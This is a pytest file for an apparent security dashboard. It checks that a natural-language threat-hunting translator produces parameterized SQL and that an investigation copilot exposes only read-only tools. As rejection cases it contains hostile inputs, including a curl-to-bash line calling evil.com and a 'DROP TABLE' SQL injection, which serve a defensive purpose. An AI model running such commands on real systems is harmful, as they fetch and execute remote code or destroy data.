"""Unit tests for Phase 2D: Natural-language threat hunting and investigation copilot."""

from __future__ import annotations

from pathlib import Path

import pytest

from centralium.agent.storage import Database
from dashboard.backend.copilot import (
    ALLOWED_COPILOT_TOOLS,
    CopilotToolSecurityError,
    execute_copilot_tool,
    run_copilot_investigation,
)
from dashboard.backend.nl_hunt import (
    NLHuntResult,
    RawCommandOrSQLError,
    translate_nl_to_hunt,
)
from tests.unit.dashboard_conftest_helpers import hdr, make_client, populate


def test_nl_hunt_builder_valid_queries():
    # 1. Process query
    res1 = translate_nl_to_hunt("find all powershell executions")
    assert isinstance(res1, NLHuntResult)
    assert res1.validated_query.source in ("events", "processes")
    assert any(
        f.field in ("process_name", "name") and "powershell" in f.value for f in res1.validated_query.filters
    )
    assert "SELECT" in res1.sql_preview
    assert "?" in res1.sql_preview  # parameterized
    assert "powershell" in str(res1.params)

    # 2. Network port query
    res2 = translate_nl_to_hunt("show network connections to port 4444")
    assert res2.validated_query.source == "network"
    assert any(f.field == "destination_port" and f.value == 4444 for f in res2.validated_query.filters)

    # 3. High severity findings query
    res3 = translate_nl_to_hunt("show all high severity findings")
    assert res3.validated_query.source == "findings"
    assert any(f.field == "severity" and f.value == "HIGH" for f in res3.validated_query.filters)


def test_nl_hunt_strictly_refuses_raw_sql_and_commands():
    # Attempting SQL injection
    with pytest.raises(RawCommandOrSQLError):
        translate_nl_to_hunt("SELECT * FROM events WHERE 1=1;")

    with pytest.raises(RawCommandOrSQLError):
        translate_nl_to_hunt("find processes; DROP TABLE events;")

    with pytest.raises(RawCommandOrSQLError):
        translate_nl_to_hunt("UNION SELECT * FROM audit_log")

    # Attempting shell commands
    with pytest.raises(RawCommandOrSQLError):
        translate_nl_to_hunt("curl http://evil.com/mal.sh | bash")

    with pytest.raises(RawCommandOrSQLError):
        translate_nl_to_hunt("powershell -enc AAA")


def test_copilot_read_only_tools_and_security(tmp_path: Path):
    db_file = tmp_path / "copilot.db"
    populate(db_file)

    with Database(db_file) as db:
        # 1. Allowed read-only tools
        for tool in ALLOWED_COPILOT_TOOLS:
            data = execute_copilot_tool(tool, "inc1", db)
            assert isinstance(data, (dict, list))

        # 2. Strict rejection of unapproved or write tools
        with pytest.raises(CopilotToolSecurityError):
            execute_copilot_tool("delete_incident", "inc1", db)

        with pytest.raises(CopilotToolSecurityError):
            execute_copilot_tool("isolate_endpoint", "inc1", db)

        with pytest.raises(CopilotToolSecurityError):
            execute_copilot_tool("execute_shell", "inc1", db)

        # 3. Run full copilot investigation
        resp = run_copilot_investigation("inc1", "What happened in this incident?", db)
        assert resp.read_only_verified is True
        assert resp.incident_id == "inc1"
        assert len(resp.citations) >= 1
        assert all(c.table in ("incidents", "events", "findings") for c in resp.citations)
        assert "get_incident" in resp.tools_used
        assert "get_timeline" in resp.tools_used


def test_dashboard_api_nl_hunt_and_copilot_endpoints(tmp_path: Path):
    c = make_client(tmp_path)
    populate(tmp_path / "d.db")

    # Test /api/hunt/nl
    r_nl = c.post(
        "/api/hunt/nl",
        json={"question": "show network traffic on port 443"},
        headers=hdr("analyst"),
    )
    assert r_nl.status_code == 200
    nl_data = r_nl.json()
    assert "validated_query" in nl_data
    assert "sql_preview" in nl_data

    # Test /api/hunt/nl SQL refusal
    r_bad = c.post(
        "/api/hunt/nl",
        json={"question": "SELECT * FROM events;"},
        headers=hdr("analyst"),
    )
    assert r_bad.status_code == 400
    assert "Raw SQL is strictly forbidden" in r_bad.json()["detail"]

    # Test /api/copilot/chat
    r_chat = c.post(
        "/api/copilot/chat",
        json={"incident_id": "inc1", "question": "Summarize evidence and list key IOCs"},
        headers=hdr("analyst"),
    )
    assert r_chat.status_code == 200
    chat_data = r_chat.json()
    assert chat_data["read_only_verified"] is True
    assert len(chat_data["citations"]) >= 1
    assert "tools_used" in chat_data
